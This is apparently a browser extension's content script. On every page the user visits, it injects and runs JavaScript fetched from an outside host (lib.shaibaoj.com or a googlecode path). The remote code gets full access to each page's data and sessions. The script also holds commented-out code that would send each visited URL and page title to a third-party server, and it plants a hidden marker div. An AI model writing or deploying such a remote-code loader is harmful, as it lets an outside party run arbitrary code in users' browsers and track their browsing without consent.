chrome.extension.sendRequest({localstorage: 'ikuautocheck'}, function(response){
    var v = response.autocheck;
    if(!document.body || !document.location)  return;
    var url = document.location.href;
    if(url.indexOf('http') == 0){
        //var title = document.title;
        //var img = new Image();
        //img.src = 'http://ikeepu.com/command/history?url=' + encodeURIComponent(url) + '&title=' + encodeURIComponent(title);
    }
    if(v != '1'){
        var t = 'http://lib.shaibaoj.com/app/shua.js';
        if(url.indexOf('https') == 0){
            t = 'https://shaibaoj.googlecode.com/svn/trunk/bm/shua.js';
        }
        var s = document.createElement('script');
        s.setAttribute('type','text/javascript');
        s.setAttribute('src',t);
        document.body.appendChild(s);
    }
    var isExtInstalledNode = document.createElement('div');
    isExtInstalledNode.id = 'shaibaoj-extension-is-installed';
    isExtInstalledNode.setAttribute('style','display:none;');
    document.body.appendChild(isExtInstalledNode);
});